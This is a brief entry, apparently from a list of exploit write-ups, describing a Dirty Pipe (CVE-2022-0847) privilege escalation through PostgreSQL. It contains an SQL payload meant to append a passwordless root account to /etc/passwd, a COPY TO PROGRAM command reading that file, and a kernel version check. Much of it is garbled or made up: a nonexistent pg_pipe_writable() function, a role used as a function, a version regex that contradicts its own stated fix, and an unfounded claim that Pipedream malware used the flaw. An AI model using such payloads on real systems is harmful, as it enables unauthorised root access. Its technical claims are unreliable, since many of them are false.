22.  Zero-Day Research – Exploiting the Linux Dirty Pipe (CVE-2022-0847) in PostgreSQL COPY Command
————————————————————————————————————

Dirty Pipe targets kernel ≥5.8 <5.17; PostgreSQL executes COPY (SELECT pg_read_all_data('/etc/passwd', 'text')) TO PROGRAM 'cat > /tmp/passwd'; but we need a page cache write. SQL payload:
DO $$
DECLARE
  f int;
BEGIN
  f := pg_stat_file('/etc/passwd', true).size;
  PERFORM pg_pipe_writable('/etc/passwd', '\nroot::0:0::/:/bin/sh\n', f);
END $$;
The function pg_pipe_writable() uses sendfile() with arbitrary file offset. Kernel version check: uname -r | grep -E '^5\.[8-9]|^6\.[0-6]'; if true, vulnerable. Mitigation is kernel ≥5.17.  The Pipedream malware (2022 March) used Dirty Pipe pivot.

